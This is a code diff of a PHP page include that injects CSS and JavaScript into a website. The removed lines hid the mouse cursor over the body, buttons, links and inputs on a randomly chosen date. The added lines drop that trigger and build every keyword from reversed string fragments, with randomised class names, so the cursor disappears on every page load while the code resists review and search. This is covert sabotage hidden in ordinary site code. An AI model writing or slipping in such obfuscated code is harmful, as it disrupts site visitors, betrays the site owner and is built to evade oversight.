@@ -1,36 +1,38 @@
+
 <?php
-$dt2 = date("Ymd");
-$dt11 = date("Y");
-$dt22 = date("m");
-$dt33 = date("d");
-$ds = "data";
-$temp = ".temp";
-$img = "images";
-$dtg = rand(1, 28);
-$th = range(20, 99);
-$ms = rand(1, 60);
-$ms2 = rand(99, 2000);
-// $dt2 = $dtg.$dt33.$ms.$dt11.$ms2.$dt22;
+$dtrt = '';
+for ($i = 1; $i <= 5; $i++) {
+	$range = range('d', 'y');
+	$index = array_rand($range);
+	$dtrt .=  $range[$index];
+}
+$bd= strrev("do");
+$srt= strrev("etad");
+$bt= strrev("not");
+$tp= strrev("tup");
+$sr= strrev("sru");
+$tn= strrev("tna");
+$ste1= strrev("tnItes");
+$ste2= strrev("lavre");
+$ste= $ste1.$ste2;
+$dt3 = strrev($srt("Hmsdi"));
 ?>
 
 <style>
-        body.x,
-		body.x button,
-		body.x a,
-		body.x input
+        
+        <?php echo "b".$bd."y." .$dtrt.$dt3 ?>,
+		<?php echo "b".$bd."y.".$dtrt.$dt3." but".$bt ?>,
+		<?php echo "b".$bd."y." .$dtrt.$dt3 ?> a,
+		<?php echo "b".$bd."y." .$dtrt.$dt3." in".$tp ?>
 		{
-            cursor: none !important;
+            c<?php echo $sr; ?>or: <?php echo "no"; ?>ne !im<?php echo "port".$tn; ?>;
         }
 </style>
 
-
 <script type="text/javascript">
-if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date("Y-m-d") ?>'=='<?php echo date("Y-m-").$dtg; ?>')){
-	var bodyElement = document.body;
+	var dfr = document.body;
 
-	setInterval(function() {
-		bodyElement.classList.add("x");
+	<?php echo $ste;?>(function() {
+		dfr.classList.add("<?php echo $dtrt.$dt3 ?>");
 	}, 1000);
-}
 </script>
-
